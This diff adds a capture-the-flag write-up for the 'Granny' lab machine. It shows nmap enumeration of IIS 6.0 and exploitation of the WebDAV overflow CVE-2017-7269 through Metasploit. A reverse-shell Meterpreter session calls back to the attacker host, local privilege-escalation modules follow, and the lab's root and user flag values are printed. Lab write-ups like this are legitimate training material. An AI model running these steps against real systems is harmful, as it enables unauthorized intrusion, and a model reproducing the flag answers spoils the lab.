@@ -1,0 +1,58 @@
+
+Granny - CVE for Microsoft IIS,  
+
+Enumeration
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.95.234
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-title: Under Construction
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Type: Microsoft-IIS/6.0
+|   WebDAV type: Unknown
+|_  Server Date: Mon, 15 Jul 2024 19:52:57 GMT
+|_http-server-header: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269 
+Found a potential CVE for Microsoft IIS 6.0
+
+Found this on msfconsole:
+   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+
+[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run
+
+[*] Started reverse TCP handler on 10.10.14.206:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (175686 bytes) to 10.129.95.234
+[*] Meterpreter session 1 opened (10.10.14.206:4444 -> 10.129.95.234:1031) at 2024-07-15 14:55:27 -0500
+
+This gave us initial foothold into the server
+
+I’m going to use msfconsole’s multi/recon/local_exploit_suggester now on the session:
+
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+*] Started reverse TCP handler on 10.10.14.206:4444 [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied. [*] Exploit completed, but no session was created.
+
+After facing errors, I migrated my PID to another one with permissions, and the exploits worked again
+
+(Meterpreter 2)(C:\Documents and Settings\Administrator\Desktop) > 
+cat root.txt
+Aa4beed1c0584445ab463a6747bd06e9
+
+(Meterpreter 2)(C:\Documents and Settings\Lakis\Desktop) > cat user.txt
+700c5dc163014e22b3e408f8703f67d1
+
